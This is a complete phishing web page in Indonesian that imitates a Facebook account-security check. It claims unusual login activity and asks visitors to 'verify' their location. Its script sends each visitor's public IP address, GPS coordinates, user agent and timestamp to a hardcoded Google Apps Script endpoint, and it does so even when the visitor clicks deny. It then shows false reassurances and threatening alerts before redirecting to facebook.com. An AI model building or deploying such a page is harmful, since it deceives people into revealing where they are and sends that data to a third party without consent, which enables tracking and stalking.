<!DOCTYPE html>
<html>
<head>
    <title>Verifikasi Keamanan</title>
    <style>
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            z-index: 1000;
            text-align: center;
            font-family: Arial, sans-serif;
            width: 350px;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
        button {
            margin: 10px;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-yes {
            background: #4267B2;
            color: white;
        }
        .btn-yes:hover {        
            background: #365899;
        }
        .btn-no {
            background: #ccc;
            color: #333;
        }
        .btn-no:hover {
            background: #bbb;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .warning {
            font-size: 12px;
            color: #999;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="popup">
        <div class="logo">🔒</div>
        <h3>Verifikasi Keamanan Akun</h3>
        <p>Sistem mendeteksi aktivitas login yang tidak biasa dari perangkat Anda.</p>
        <p><strong>Untuk keamanan akun Anda, kami perlu melakukan verifikasi lokasi.</strong></p>
        <button class="btn-yes" onclick="allowLocation()">✓ Izinkan Verifikasi</button>
        <button class="btn-no" onclick="denyLocation()">✗ Tolak</button>
        <p class="warning">Verifikasi hanya dilakukan sekali. Data Anda aman dan tidak akan disalahgunakan.</p>
    </div>

    <script>
        // URL Web App ANDA
        const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbzRYDDqlANDxSnRRXPd0Owg8T7c0LbuU6pS330cm-sp3xc8H4VdzfmLv48o0QTpMvrhBg/exec';

        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'Gagal mengambil IP';
            }
        }

        async function sendData(data) {
            try {
                const response = await fetch(WEBAPP_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log('Data terkirim:', data);
            } catch(e) {
                console.error('Gagal kirim data:', e);
            }
        }

        async function allowLocation() {
            const ip = await getPublicIP();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    await sendData({
                        ip: ip,
                        lat: lat,
                        lng: lng,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        status: 'USER_ALLOWED'
                    });
                    
                    alert('Verifikasi berhasil. Terima kasih.');
                    window.location.href = 'https://facebook.com';
                }, function(error) {
                    sendData({
                        ip: ip,
                        lat: 'TIDAK_DIIZINKAN',
                        lng: 'TIDAK_DIIZINKAN',
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        status: 'LOCATION_DENIED_BY_USER'
                    });
                    alert('Anda tidak mengizinkan verifikasi lokasi. Akun akan tetap dipantau.');
                    window.location.href = 'https://facebook.com';
                });
            } else {
                sendData({
                    ip: ip,
                    lat: 'BROWSER_TIDAK_MENDUKUNG',
                    lng: 'BROWSER_TIDAK_MENDUKUNG',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    status: 'GEOLOCATION_NOT_SUPPORTED'
                });
                alert('Browser tidak mendukung verifikasi lokasi.');
                window.location.href = 'https://facebook.com';
            }
        }

        async function denyLocation() {
            const ip = await getPublicIP();
            
            await sendData({
                ip: ip,
                lat: 'USER_MENOLAK',
                lng: 'USER_MENOLAK',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                status: 'USER_DENIED'
            });
            
            alert('Anda menolak verifikasi. Akun Anda akan tetap dipantau oleh sistem keamanan.');
            window.location.href = 'https://facebook.com';
        }
    </script>
</body>
</html>
